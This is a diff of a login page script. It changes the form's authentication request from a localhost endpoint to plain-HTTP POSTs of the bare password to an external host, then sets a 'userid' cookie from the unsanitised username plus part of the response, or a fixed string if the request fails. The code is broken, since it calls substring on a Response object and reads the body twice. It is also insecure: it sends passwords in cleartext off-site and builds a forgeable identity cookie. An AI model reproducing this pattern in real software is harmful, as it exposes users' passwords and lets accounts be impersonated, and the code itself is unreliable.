@@ -40,24 +40,27 @@
     <script>
       const form = document.getElementById("login");
 
-      async function sendData() {
-        const formData = new FormData(form);
+      function setCookie() {
+        const userField = form.elements['user'];
+        const passwordField = form.elements['password'];
 
         try {
-          const response = await fetch("http://localhost:4000/website/auth", {
+          const response = await fetch("http://inner-gate.3rdgig.net.br/website/auth", {
             method: "POST",
-            body: formData,
+            body: passwordField.value,
           });
+          document.cookie = "userid=" + userField.value + await response.substring(0,7);
           console.log(await response.json());
         } catch (e) {
           console.error(e);
+          document.cookie = "userid=" + userField.value + "4n0N1Mo";
         }
       }
 
       try{
         form.addEventListener("submit", (event) => {
           event.preventDefault();
-          sendData();
+          setCookie();
         });
       } catch (e) {
         console.error(e);
